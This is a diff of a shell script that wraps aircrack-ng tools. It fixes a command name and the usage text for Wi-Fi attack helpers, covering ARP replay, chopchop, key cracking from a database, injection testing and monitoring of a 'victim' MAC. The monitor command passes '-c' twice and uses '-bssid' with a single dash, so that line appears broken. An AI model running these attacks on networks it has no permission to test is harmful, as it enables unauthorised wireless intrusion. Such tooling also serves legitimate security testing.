@@ -387,7 +387,7 @@ function monitor_victim_mac_on_interface_channel () {
     local INTERFACE="${4:-wlan0mon}"
     local CHANNEL=${5:-5}
     exec_msg "airodump-ng -c $CHANNEL -bssid $ACCESS_POINT_BSSID -c $VICTIM_MAC $INTERFACE"
-    airodump -c $CHANNEL -bssid "$ACCESS_POINT_BSSID" -c "$VICTIM_MAC" "$INTERFACE"
+    airodump-ng -c $CHANNEL -bssid "$ACCESS_POINT_BSSID" -c "$VICTIM_MAC" "$INTERFACE"
     return $?
 }
 
@@ -974,13 +974,13 @@ function display_usage () {
 24. start-arp-replay-attack_________________________<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon)____aireplay-ng -3 -b <ap-bssid> -h <victim-mac> <interface>
 25. start-database-attack___________________________<SQLITE3-DB-FILE> <CAPTURE-FILE>__________________________aircrack-ng -r <sqlite3-db-file> <capture-file>
 26. start-chopchop-attack___________________________<ACCESS-POINT-BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon)____aireplay-ng -4 -b <ap-bssid> -h <victim-mac> <interface>
-27. restart_wpa_supplicant____________________________________________________________________________________service wpa_supplicant restart
+27. restart-wpa-supplicant____________________________________________________________________________________service wpa_supplicant restart
 28. set-interface-monitor-mode______________________(INTERFACE|wlan0mon)______________________________________iwconfig <interface> mode monitor
 29. set-up-interface________________________________(INTERFACE|wlan0mon)______________________________________ifconfig <interface> up
 30. set-wifi-regulatory-domain______________________(REG-DOMAIN|BO)___________________________________________iw reg set <reg-domain>
 31. stop-monitor-interface__________________________(INTERFACE|wlan0mon)______________________________________airmon-ng stop <interface>
 32. check-interface_________________________________(INTERFACE|wlan0)_________________________________________iwconfig <interface>
-33. check-injection-is_working______________________(INTERFACE|wlan0mon)______________________________________aireplay-ng -9 <interface>
+33. check-injection-is-working______________________(INTERFACE|wlan0mon)______________________________________aireplay-ng -9 <interface>
 34. monitor-wireless-access-point___________________<ACCESS-POINT-BSSID> (INTERFACE|wlan0mon) (CHANNEL|5)_____airodump-ng -c <channel> --bssid <ap-bssid> <interface>
 35. monitor-victim-mac-on-interface-channel_________<BSSID> <VICTIM-MAC> (INTERFACE|wlan0mon) (CHANNEL|5)_____airodump-ng -c <channel> -bssid <ap-bssid> -c <victim-mac> <interface>
 36. monitor-interface_______________________________(INTERFACE|wlan0mon)______________________________________airodump-ng <interface>
